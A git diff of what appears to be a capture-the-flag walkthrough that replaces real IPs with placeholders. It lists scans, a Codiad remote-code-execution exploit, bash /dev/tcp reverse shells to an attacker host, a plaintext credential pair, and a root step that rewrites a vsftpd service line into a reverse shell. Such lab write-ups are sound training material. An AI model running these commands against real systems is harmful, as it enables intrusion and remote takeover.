@@ -1,12 +1,12 @@
 ## enumeration ## 
 
-rustscan -a  10.10.87.74 -- 
+rustscan -a  target_ip_address -- 
 
-sudo python3 /opt/dirsearch/dirsearch.py -u http://10.10.87.74 -e txt .htm. .php .js 
+sudo python3 /opt/dirsearch/dirsearch.py -u http://target_ip_address -e txt .htm. .php .js 
 
 cd /usr/local/bin
 
-sudo python3 autorecon 10.10.87.74
+sudo python3 autorecon target_ip_address
 
 
 ## Information ##
@@ -27,7 +27,7 @@ I have reset the password as you have asked. Please use the default password to 
 Also, please take care of the image file ;)
 - drac.
 
-nmap -sT -Pn -A --script vuln -p- -T4 -v 10.10.87.74
+nmap -sT -Pn -A --script vuln -p- -T4 -v target_ip_address
 
 
 #port 62337 is running http, so let's open the page in a browser
@@ -42,10 +42,10 @@ can use wget https://raw.githubusercontent.com/WangYihang/Codiad-Remote-Code-Exe
 
 
 #run the code below but do not press Y yet.
-python codiad.py http://10.10.87.74/ john password 10.8.0.54 1234 linux
+python codiad.py http://target_ip_address/ john password attacker_ip_address 1234 linux
 
 #execute the following two commands in two separate windows 
-echo 'bash -c "bash -i >/dev/tcp/10.8.0.54/1235 0>&1 2>&1"' | nc -lnvp 1234
+echo 'bash -c "bash -i >/dev/tcp/attacker_ip_address/1235 0>&1 2>&1"' | nc -lnvp 1234
 nc -lnvp 1235
 
 #shell! 
@@ -59,7 +59,7 @@ run linpeas.sh
 
 mysql -u drac -p 'Th3dRaCULa1sR3aL', secret, foobar
 
-#we test ssh drac@10.10.87.74, #shell! 
+#we test ssh drac@target_ip_address, #shell! 
 
 drac:Th3dRaCULa1sR3aL
 
@@ -73,7 +73,7 @@ drac:Th3dRaCULa1sR3aL
 #change 
 ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
 #to
-ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.8.0.54/4444 0>&1"
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/attacker_ip_address/4444 0>&1"
 
 #open nc -nlvp 4444 and run 
 sudo /usr/sbin/service vsftpd restart
